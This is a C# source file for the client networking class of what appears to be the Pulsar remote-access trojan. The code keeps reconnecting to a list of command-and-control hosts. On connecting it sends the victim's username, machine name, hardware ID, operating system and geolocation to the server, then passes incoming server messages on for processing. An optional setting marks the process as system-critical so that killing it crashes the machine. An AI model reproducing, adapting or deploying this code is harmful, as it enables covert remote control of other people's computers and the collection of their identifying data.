using NAudio.CoreAudioApi;
using Pulsar.Client.Helper;
using Pulsar.Client.IO;
using Pulsar.Client.IpGeoLocation;
using Pulsar.Client.User;
using Pulsar.Common.DNS;
using Pulsar.Common.Helpers;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages;
using Pulsar.Common.Utilities;
using Pulsar.Client.Config;
using System;
using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Pulsar.Common.UAC;
using Pulsar.Client.Utilities;

namespace Pulsar.Client.Networking
{
    public class PulsarClient : SecureClient, IDisposable
    {
        /// <summary>
        /// Used to keep track if the client has been identified by the server.
        /// </summary>
        private bool _identified;

        /// <summary>
        /// The hosts manager which contains the available hosts to connect to.
        /// </summary>
        private readonly HostsManager _hosts;

        /// <summary>
        /// Random number generator to slightly randomize the reconnection delay.
        /// </summary>
        private readonly SafeRandom _random;

        /// <summary>
        /// Create a <see cref="_token"/> and signals cancellation.
        /// </summary>
        private readonly CancellationTokenSource _tokenSource;

        /// <summary>
        /// The token to check for cancellation.
        /// </summary>
        private readonly CancellationToken _token;

        /// <summary>
        /// Initializes a new instance of the <see cref="PulsarClient"/> class.
        /// </summary>
        /// <param name="hostsManager">The hosts manager which contains the available hosts to connect to.</param>
        /// <param name="serverCertificate">The server certificate.</param>
        public PulsarClient(HostsManager hostsManager, X509Certificate2 serverCertificate)
            : base(serverCertificate, Settings.AESE2EKEY)
        {
            _hosts = hostsManager;
            _random = new SafeRandom();
            base.ClientState += OnClientState;
            base.ClientRead += OnClientRead;
            base.ClientFail += OnClientFail;
            _tokenSource = new CancellationTokenSource();
            _token = _tokenSource.Token;
        }

        /// <summary>
        /// Connection loop used to reconnect and keep the connection open.
        /// </summary>
        public void ConnectLoop()
        {
            while (!_token.IsCancellationRequested)
            {
                if (!Connected)
                {
                    var host = _hosts.GetNextHost();

                    if (host?.IpAddress == null)
                    {
                        Debug.WriteLine("Failed to get a valid host to connect to. Will retry after delay.");
                        Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
                        continue;
                    }

                    try
                    {
                        base.Connect(host.IpAddress, host.Port);
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Connection attempt failed: {ex.Message}");
                    }
                }

                while (Connected)
                {
                    try
                    {
                        _token.WaitHandle.WaitOne(1000);
                    }
                    catch (NullReferenceException)
                    {
                        Disconnect();
                        return;
                    }
                    catch (ObjectDisposedException)
                    {
                        Disconnect();
                        return;
                    }
                }

                if (_token.IsCancellationRequested)
                {
                    Disconnect();
                    return;
                }

                Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
            }
        }

        private void OnClientRead(Client client, IMessage message, int messageLength)
        {
            if (!_identified)
            {
                if (message is ClientIdentificationResult reply)
                {
                    _identified = reply.Result;
                }
                return;
            }

            MessageHandler.Process(client, message);
        }

        private void OnClientFail(Client client, Exception ex)
        {
            Debug.WriteLine($"Client Fail - Exception Message: {ex.Message}");
            client.Disconnect();
        }

        private void OnClientState(Client client, bool connected)
        {
            _identified = false; // always reset identification

            if (connected)
            {
                // send client identification once connected

                var geoInfo = GeoInformationFactory.GetGeoInformation();
                var userAccount = new UserAccount();

                client.Send(new ClientIdentification
                {
                    Version = Settings.VERSION,
                    OperatingSystem = PlatformHelper.FullName,
                    AccountType = userAccount.Type.ToString(),
                    Country = geoInfo.Country,
                    CountryCode = geoInfo.CountryCode,
                    ImageIndex = geoInfo.ImageIndex,
                    Id = HardwareDevices.HardwareId,
                    Username = userAccount.UserName,
                    PcName = SystemHelper.GetPcName(),
                    Tag = Settings.TAG,
                    EncryptionKey = Settings.ENCRYPTIONKEY,
                    Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE)
                });
            }
        }

        /// <summary>
        /// Stops the connection loop and disconnects the connection.
        /// </summary>
        public void Exit()
        {
            if (Settings.MAKEPROCESSCRITICAL && UAC.IsAdministrator())
            {
                NativeMethods.RtlSetProcessIsCritical(0, 0, 0);
            }

            _tokenSource.Cancel();
            Disconnect();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                _tokenSource.Cancel();
                _tokenSource.Dispose();
            }
        }
    }
}
